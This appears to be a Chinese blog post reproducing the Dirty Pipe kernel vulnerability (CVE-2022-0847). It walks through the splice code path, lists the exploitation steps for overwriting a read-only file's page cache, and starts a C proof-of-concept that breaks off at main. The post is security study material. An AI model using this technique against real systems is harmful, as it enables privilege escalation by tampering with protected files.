<img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2ce26b318f3351964addd666a2e2e1a2.jpg" srcset="/img/loading.gif" lazyload class="">

<p>然后我们查看<code>do_splice_from</code>函数,这是第二种情况的判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">762</span> <span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,                                </span><br><span class="hljs-params"><span class="hljs-number">763</span>                <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>764 &#123;   <br><span class="hljs-number">765</span>     <span class="hljs-keyword">if</span> (unlikely(!out-&gt;f_op-&gt;splice_write))<br><span class="hljs-number">766</span>         <span class="hljs-keyword">return</span> warn_unsupported(out, <span class="hljs-string">&quot;write&quot;</span>);<br><span class="hljs-number">767</span>     <span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br><span class="hljs-number">768</span> &#125;    <br></code></pre></td></tr></table></figure>

<p>这里调用到splice_write函数,他在普通文件当中的初始化函数指针指向<code>iter_file_splice_write</code>,大意是将ipipe的即将复制pipe_buffer中指向的page页指针赋值给一个<code>bio_vec</code>数组,他的结构如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">32</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bio_vec</span> &#123;</span>                                                                                           <br><span class="hljs-number">33</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">bv_page</span>;</span><br><span class="hljs-number">34</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    bv_len;<br><span class="hljs-number">35</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    bv_offset;<br><span class="hljs-number">36</span> &#125;;   <br></code></pre></td></tr></table></figure>

<p>然后之后调用<code>vfs_iter_write</code>写入文件buffer</p>
<h3 id="three-file-to-pipe"><a href="#three-file-to-pipe" class="headerlink" title=":three: file_to_pipe"></a>:three: file_to_pipe</h3><p>然后是最后一部分的<code>do_splice</code>,也是咱们本次漏洞的重点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (opipe) &#123;<br><span class="hljs-number">1091</span>         <span class="hljs-keyword">if</span> (off_out)<br><span class="hljs-number">1092</span>             <span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-number">1093</span>         <span class="hljs-keyword">if</span> (off_in) &#123;<br><span class="hljs-number">1094</span>             <span class="hljs-keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))<br><span class="hljs-number">1095</span>                 <span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-number">1096</span>             offset = *off_in;<br><span class="hljs-number">1097</span>         &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">1098</span>             offset = in-&gt;f_pos;<br><span class="hljs-number">1099</span>         &#125;<br><span class="hljs-number">1100</span> <br><span class="hljs-number">1101</span>         <span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br><span class="hljs-number">1102</span>             flags |= SPLICE_F_NONBLOCK;<br><span class="hljs-number">1103</span> <br><span class="hljs-number">1104</span>         ret = splice_file_to_pipe(in, opipe, &amp;offset, len, flags);<br><span class="hljs-number">1105</span>         <span class="hljs-keyword">if</span> (!off_in)<br><span class="hljs-number">1106</span>             in-&gt;f_pos = offset;<br><span class="hljs-number">1107</span>         <span class="hljs-keyword">else</span><br><span class="hljs-number">1108</span>             *off_in = offset;<br><span class="hljs-number">1109</span> <br><span class="hljs-number">1110</span>         <span class="hljs-keyword">return</span> ret;<br><span class="hljs-number">1111</span>     &#125;<br><span class="hljs-number">1112</span> <br><span class="hljs-number">1113</span>     <span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-number">1114</span> &#125;<br><br></code></pre></td></tr></table></figure>

<p>直接查看<code>splice_file_to_pipe</code> 调用链,这里有个小知识那就是我们要知道某个文件的ops,我们可以直接去查看<code>&lt;name&gt;_file_operations</code>,其中<code>&lt;name&gt;</code>为我们的文件系统名称,例如<code>ext4</code>等等</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">splice_file_to_pipe<br>	do_splice_to<br>		<span class="hljs-function"><span class="hljs-title">in</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">f_op</span>-&gt;</span>splice_read &lt;==&gt; generic_file_splice_read<br>			call_read_iter<br>				<span class="hljs-function"><span class="hljs-title">in</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">f_op</span>-&gt;</span>read_iter &lt;==&gt; generic_file_read_iter<br></code></pre></td></tr></table></figure>

<p>好我们链条就先到这里,先查看该函数,下面是内核开发者对该函数作出的解释</p>
<blockquote>
<p>This is the “read_iter()” routine for all filesystems that can use the page cache directly.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">2772</span> generic_file_read_iter(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)<br><span class="hljs-number">2773</span> &#123;<br><span class="hljs-number">2774</span>     <span class="hljs-type">size_t</span> count = iov_iter_count(iter); 	<span class="hljs-comment">//返回iter-&gt;count,也就是我们复制的字节数</span><br><span class="hljs-number">2775</span>     <span class="hljs-type">ssize_t</span> retval = <span class="hljs-number">0</span>;<br><span class="hljs-number">2776</span> <br><span class="hljs-number">2777</span>     <span class="hljs-keyword">if</span> (!count)<br><span class="hljs-number">2778</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* skip atime */</span><br><span class="hljs-number">2779</span> <br><span class="hljs-number">2780</span>     <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123; 	<span class="hljs-comment">//看是否文件标识带有O_DIRECT,若有该标识,则绕过cache</span><br><span class="hljs-number">2781</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-number">2782</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span> =</span> file-&gt;f_mapping;<br><span class="hljs-number">2783</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> mapping-&gt;host;<br><span class="hljs-number">2784</span> <br><span class="hljs-number">2785</span>         <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT) &#123;<br><span class="hljs-number">2786</span>             <span class="hljs-keyword">if</span> (filemap_range_needs_writeback(mapping, iocb-&gt;ki_pos,<br><span class="hljs-number">2787</span>                         iocb-&gt;ki_pos + count - <span class="hljs-number">1</span>))<br><span class="hljs-number">2788</span>                 <span class="hljs-keyword">return</span> -EAGAIN;<br><span class="hljs-number">2789</span>         &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">2790</span>             retval = filemap_write_and_wait_range(mapping,<br><span class="hljs-number">2791</span>                         iocb-&gt;ki_pos,<br><span class="hljs-number">2792</span>                             iocb-&gt;ki_pos + count - <span class="hljs-number">1</span>);<br><span class="hljs-number">2793</span>             <span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br><span class="hljs-number">2794</span>                 <span class="hljs-keyword">return</span> retval;<br><span class="hljs-number">2795</span>         &#125;<br><span class="hljs-number">2796</span> <br><span class="hljs-number">2797</span>         file_accessed(file);<br><span class="hljs-number">2798</span> <br><span class="hljs-number">2799</span>         retval = mapping-&gt;a_ops-&gt;direct_IO(iocb, iter);<br><span class="hljs-number">2800</span>         <span class="hljs-keyword">if</span> (retval &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-number">2801</span>             iocb-&gt;ki_pos += retval;<br><span class="hljs-number">2802</span>             count -= retval;<br><span class="hljs-number">2803</span>         &#125;<br><span class="hljs-number">2804</span>         <span class="hljs-keyword">if</span> (retval != -EIOCBQUEUED)<br><span class="hljs-number">2805</span>             iov_iter_revert(iter, count - iov_iter_count(iter));<br><span class="hljs-number">2806</span> <br><span class="hljs-number">2807</span>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">2808          * Btrfs can have a short DIO read if we encounter</span><br><span class="hljs-comment">2809          * compressed extents, so if there was an error, or if</span><br><span class="hljs-comment">2810          * we&#x27;ve already read everything we wanted to, or if</span><br><span class="hljs-comment">2811          * there was a short read because we hit EOF, go ahead</span><br><span class="hljs-comment">2812          * and return.  Otherwise fallthrough to buffered io for</span><br><span class="hljs-comment">2813          * the rest of the read.  Buffered reads will not work for</span><br><span class="hljs-comment">2814          * DAX files, so don&#x27;t bother trying.</span><br><span class="hljs-comment">2815          */</span><br><span class="hljs-number">2816</span>         <span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span> || !count || IS_DAX(inode))<br><span class="hljs-number">2817</span>             <span class="hljs-keyword">return</span> retval;<br><span class="hljs-number">2818</span>         <span class="hljs-keyword">if</span> (iocb-&gt;ki_pos &gt;= i_size_read(inode))<br><span class="hljs-number">2819</span>             <span class="hljs-keyword">return</span> retval;<br><span class="hljs-number">2820</span>     &#125;<br><span class="hljs-number">2821</span> <br><span class="hljs-number">2822</span>     <span class="hljs-keyword">return</span> filemap_read(iocb, iter, retval);<br><span class="hljs-number">2823</span> &#125;<br><span class="hljs-number">2824</span> EXPORT_SYMBOL(generic_file_read_iter);<br><br></code></pre></td></tr></table></figure>

<p>其中涉及到两个中间变量 <code>iocb</code>和<code>iter</code>,他们两个是在<code>generic_file_splice_read</code>当中进行初始化的,下面分别给出初始化步骤:</p>
<ul>
<li><p>iter</p>
<img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240318095529267.png" srcset="/img/loading.gif" lazyload class="">
</li>
<li><p>iocb</p>
<img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240318095606868.png" srcset="/img/loading.gif" lazyload class=""></li>
</ul>
<p>然后我们看到最后调用<code>filemap_read</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">2642</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">filemap_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter,</span><br><span class="hljs-params"><span class="hljs-number">2643</span>         <span class="hljs-type">ssize_t</span> already_read)</span><br>2644 &#123;<br><span class="hljs-number">2645</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp; 	<span class="hljs-comment">//获取in_file文件</span><br><span class="hljs-number">2646</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_ra_state</span> *<span class="hljs-title">ra</span> =</span> &amp;filp-&gt;f_ra;<br><span class="hljs-number">2647</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span> =</span> filp-&gt;f_mapping; <span class="hljs-comment">//查看文件映射部分</span><br><span class="hljs-number">2648</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> mapping-&gt;host; 	<span class="hljs-comment">//获取in_file对应的inode</span><br><span class="hljs-number">2649</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio_batch</span> <span class="hljs-title">fbatch</span>;</span><br><span class="hljs-number">2650</span>     <span class="hljs-type">int</span> i, error = <span class="hljs-number">0</span>;<br><span class="hljs-number">2651</span>     <span class="hljs-type">bool</span> writably_mapped;<br><span class="hljs-number">2652</span>     <span class="hljs-type">loff_t</span> isize, end_offset;<br><span class="hljs-number">2653</span> <br>		 ...<br><span class="hljs-number">2661</span> <br><span class="hljs-number">2662</span>     <span class="hljs-keyword">do</span> &#123;<br><span class="hljs-number">2663</span>         cond_resched();<br><span class="hljs-number">2664</span> <br><span class="hljs-number">2665</span>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">2666          * If we&#x27;ve already successfully copied some data, then we</span><br><span class="hljs-comment">2667          * can no longer safely return -EIOCBQUEUED. Hence mark</span><br><span class="hljs-comment">2668          * an async read NOWAIT at that point.第一次already_read=0</span><br><span class="hljs-comment">2669          */</span><br><span class="hljs-number">2670</span>         <span class="hljs-keyword">if</span> ((iocb-&gt;ki_flags &amp; IOCB_WAITQ) &amp;&amp; already_read)<br><span class="hljs-number">2671</span>             iocb-&gt;ki_flags |= IOCB_NOWAIT;<br><span class="hljs-number">2672</span> <br><span class="hljs-number">2673</span>         <span class="hljs-keyword">if</span> (unlikely(iocb-&gt;ki_pos &gt;= i_size_read(inode)))<br><span class="hljs-number">2674</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">2675</span> <br><span class="hljs-number">2676</span>         error = filemap_get_pages(iocb, iter, &amp;fbatch);<br> 			 ...<br><span class="hljs-number">2727</span>             copied = copy_folio_to_iter(folio, offset, bytes, iter);<br><span class="hljs-number">2728</span> <br><span class="hljs-number">2729</span>             already_read += copied;<br><span class="hljs-number">2730</span>             iocb-&gt;ki_pos += copied;<br><span class="hljs-number">2731</span>             ra-&gt;prev_pos = iocb-&gt;ki_pos;<br><span class="hljs-number">2732</span> <br>			 ...<br><span class="hljs-number">2743</span> <br><span class="hljs-number">2744</span>     file_accessed(filp);<br><span class="hljs-number">2745</span> <br><span class="hljs-number">2746</span>     <span class="hljs-keyword">return</span> already_read ? already_read : error;<br><span class="hljs-number">2747</span> &#125;<br><span class="hljs-number">2748</span> EXPORT_SYMBOL_GPL(filemap_read);<br></code></pre></td></tr></table></figure>

<p>在该函数当中,我们会将数据从page cache复制到管道,这里并没有真正的进行逐字节复制.在一个dowhile的大循环当中,主要通过调用<code>copy_folio_to_iter</code>来复制chunks</p>
<blockquote>
<p>这里给出<a target="_blank" rel="noopener" href="https://lwn.net/Articles/849538/">folio发布的官方解释</a>,这样看来folio似乎是一个用来给复合页机制带来的歧义提供的解决办法,但我看到后面似乎并不受欢迎,但是由于现在替代方案较少,所以暂时将就着用吧:)</p>
</blockquote>
<p>可以得出一个结论,我们在这里可以大致将folio类比为page,这对我们接下来的理解并没有任何影响,而<code>copy_folio_to_iter</code>实际上也仅仅是调用了<code>copy_page_to_iter</code></p>
<p>我们来查看<code>copy_page_to_iter</code>函数调用链,根据文件的类型会有以下的情况</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">copy<span class="hljs-emphasis">_page_to_iter</span><br><span class="hljs-emphasis">	__copy_page_to_iter</span><br><span class="hljs-emphasis">		copy_page_to_iter_</span>pipe<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">382</span> <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"><span class="hljs-number">383</span>              <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>384 &#123;<br><span class="hljs-number">385</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br><span class="hljs-number">386</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br><span class="hljs-number">387</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br><span class="hljs-number">388</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-number">389</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br><span class="hljs-number">390</span>     <span class="hljs-type">size_t</span> off;<br><span class="hljs-number">391</span> <br><span class="hljs-number">392</span>     <span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br><span class="hljs-number">393</span>         bytes = i-&gt;count;<br><span class="hljs-number">394</span> <br><span class="hljs-number">395</span>     <span class="hljs-keyword">if</span> (unlikely(!bytes))<br><span class="hljs-number">396</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">397</span> <br><span class="hljs-number">398</span>     <span class="hljs-keyword">if</span> (!sanity(i))<br><span class="hljs-number">399</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">400</span> <br><span class="hljs-number">401</span>     off = i-&gt;iov_offset;<br><span class="hljs-number">402</span>     buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask]; 	<span class="hljs-comment">//获取pipe的head指向的pipe_buffer</span><br><span class="hljs-number">403</span>     <span class="hljs-keyword">if</span> (off) &#123;<br><span class="hljs-number">404</span>         <span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br><span class="hljs-number">405</span>             <span class="hljs-comment">/* merge with the last one */</span><br><span class="hljs-number">406</span>             buf-&gt;len += bytes;<br><span class="hljs-number">407</span>             i-&gt;iov_offset += bytes;<br><span class="hljs-number">408</span>             <span class="hljs-keyword">goto</span> out;<br><span class="hljs-number">409</span>         &#125;<br><span class="hljs-number">410</span>         i_head++;<br><span class="hljs-number">411</span>         buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><span class="hljs-number">412</span>     &#125;<br><span class="hljs-number">413</span>     <span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-number">414</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">415</span> <br><span class="hljs-number">416</span>     buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-number">417</span>     <span class="hljs-comment">//     buf-&gt;flags = 0;             这里需要我们手动将该行注释掉,然后再编译内核</span><br><span class="hljs-number">418</span>     get_page(page);<br><span class="hljs-number">419</span>     buf-&gt;page = page;<br><span class="hljs-number">420</span>     buf-&gt;offset = offset;<br><span class="hljs-number">421</span>     buf-&gt;len = bytes;<br><span class="hljs-number">422</span> <br><span class="hljs-number">423</span>     pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br><span class="hljs-number">424</span>     i-&gt;iov_offset = offset + bytes;<br><span class="hljs-number">425</span>     i-&gt;head = i_head;<br><span class="hljs-number">426</span> out:<br><span class="hljs-number">427</span>     i-&gt;count -= bytes;<br><span class="hljs-number">428</span>     <span class="hljs-keyword">return</span> bytes;                <br><span class="hljs-number">429</span> &#125;<br></code></pre></td></tr></table></figure>

<p>我们可以看到这里并没有发生实际上的数据拷贝,而仅仅是page页面指针的改写,当文章写到这里我发现5.17.9的linux内核此时已经将该漏洞进行修复,所以这里我手动将其恢复到漏洞版本</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>我们现在知道了漏洞点,那就是在我们使用splice系统调用来进行零拷贝时,从file拷贝到pipe其中的一个buff中时并没有修改其中的标识位,也就是<code>pipe_buffer-&gt;flag</code>位,<br>此时如果flag位存在<code>PIPE_BUF_FLAG_CAN_MERGE</code>,那么我们下次在写入该buffer的时候将从该<code>pipe_buffer</code>的offset+len开始写,但是此时注意,经过splice的零拷贝,我们的<code>pipe_buffer</code>是指向的pagecache的,所以这里导致我们可以直接修改pagecache当中的页面,且根本不会去考虑是否为可写,</p>
<img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240321101438362.png" srcset="/img/loading.gif" lazyload class="">

<p>所以本次漏洞利用分为以下几个步骤:</p>
<ol>
<li>分配pipe以及其中的buffer</li>
<li>首先向其中灌入大量无意义数据,再依次排空,由于读并不会修改我们的标识,所以这样使得我们每个pipe_buffer都会带有<code>PIPE_BUF_FLAG_CAN_MERGE</code>标识</li>
<li><code>splice</code>系统调用,将不可写的文件数据内容”拷贝”到pipe当中</li>
<li>我们将对于pipe的写转化为了对于不可写文件所映射到的pagecache的写</li>
</ol>
<p>下面是漏洞的poc以及演示</p>
<img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240515145624415.png" srcset="/img/loading.gif" lazyload class="">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">initial_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> *my_pipe)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">fill_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> *my_pipe)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">drain_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> *my_pipe)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">free_env</span><span class="hljs-params">(<span class="hljs-type">int</span> *my_pipe)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[5;33m!\033[0m]\033[32mDebugging Here\033[0m\n&quot;</span>);<br>    getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    